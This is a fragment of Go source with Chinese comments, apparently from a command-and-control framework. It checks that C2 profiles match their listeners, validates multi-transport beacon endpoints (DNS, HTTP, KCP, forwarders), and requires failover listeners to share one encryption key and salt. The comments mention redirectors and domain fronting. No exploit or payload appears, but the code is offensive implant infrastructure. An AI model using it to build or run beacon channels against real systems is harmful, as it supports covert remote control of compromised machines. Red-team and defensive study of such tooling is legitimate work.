		diffs = append(diffs, fmt.Sprintf("dns.beacon_prefix %q ≠ 监听器 %q", p.DNS.BeaconPrefix, def.DNS.BeaconPrefix))
	}
	if p.HTTP.Get.Padding != def.HTTP.Get.Padding {
		diffs = append(diffs, fmt.Sprintf("http.get.padding %v ≠ 监听器 %v", p.HTTP.Get.Padding, def.HTTP.Get.Padding))
	}
	if len(diffs) == 0 {
		return ""
	}
	who := listenerProfile.Name
	if who == "" {
		who = c2profile.DefaultProfileName
	}
	return "该画像的监听器侧特征与目标监听器绑定的画像（" + who + "）不一致，生成后会连不上：" +
		strings.Join(diffs, "；") +
		"。请改用该监听器绑定的画像，或先把监听器改成这个画像再重启。"
}

// validateMultiEndpoints 校验并归一化多传输端点列表。
// 返回 (归一化后的端点, 错误信息)；错误信息为空表示通过。
func validateMultiEndpoints(raw string) ([]string, string) {
	supported := map[string]bool{
		"tcp": true, "kcp": true, "http": true, "https": true, "oss": true,
		"websocket": true, "ws": true, "dns": true,
		"tcp_forward": true, "kcp_forward": true, "ws_forward": true,
		"http_forward": true, "https_forward": true,
	}
	out := make([]string, 0, 4)
	seen := map[string]bool{}
	for _, item := range strings.Split(raw, ",") {
		item = strings.TrimSpace(item)
		if item == "" {
			continue
		}
		parts := strings.SplitN(item, "://", 2)
		if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
			return nil, "端点格式必须是 scheme://address: " + item
		}
		scheme := strings.ToLower(strings.TrimSpace(parts[0]))
		if !supported[scheme] {
			return nil, "不支持的端点传输类型: " + scheme
		}
		if scheme == "ws" {
			scheme = "websocket"
		}
		normalized := scheme + "://" + strings.TrimSpace(parts[1])
		if seen[normalized] {
			continue
		}
		seen[normalized] = true
		out = append(out, normalized)
	}
	if len(out) == 0 {
		return nil, "端点列表为空"
	}
	if len(out) > 8 {
		return nil, "端点数量过多（上限 8 个）"
	}
	if len(strings.Join(out, ",")) > len(delivery.MultiEndpointsPlaceholder) {
		return nil, "端点列表总长度超限（模板占位符 512 字节）"
	}
	return out, ""
}

// checkEndpointKeyConsistency 校验多传输端点与主监听器的密钥是否一致。
//
// 客户端二进制只能携带一份 VKey/盐（首次连接前没有通道下发别的密钥）。若端点指向
// 另一个密钥不同的监听器，beacon 切过去之后服务端用另一套密钥派生会话，握手必然失败
// —— 而现场只表现为"切到备用通道就掉线"，极难排查。这里提前拒绝。
func checkEndpointKeyConsistency(endpoints []string, masterKey, salt []byte) string {
	if database.DB() == nil {
		return ""
	}
	masterStr := strings.TrimRight(string(masterKey), "\x00")
	saltStr := strings.TrimRight(string(salt), "\x00")
	for _, ep := range endpoints {
		parts := strings.SplitN(ep, "://", 2)
		if len(parts) != 2 {
			continue
		}
		addr := parts[1]
		var lis database.Listener
		lis, has, err := database.Listeners().FindByConnectOrListen(addr)
		if err != nil || !has {
			continue // 未注册的地址（重定向器/域前置）不校验
		}
		if lis.VKey == "" || lis.EncryptionSalt == "" {
			continue
		}
		if lis.VKey != masterStr || lis.EncryptionSalt != saltStr {
			return "端点 " + addr + " 对应监听器的密钥与主监听器不一致；多传输载荷只能携带一套密钥，" +
				"请改用相同 VKey/盐的监听器"
		}
	}
	return ""
}
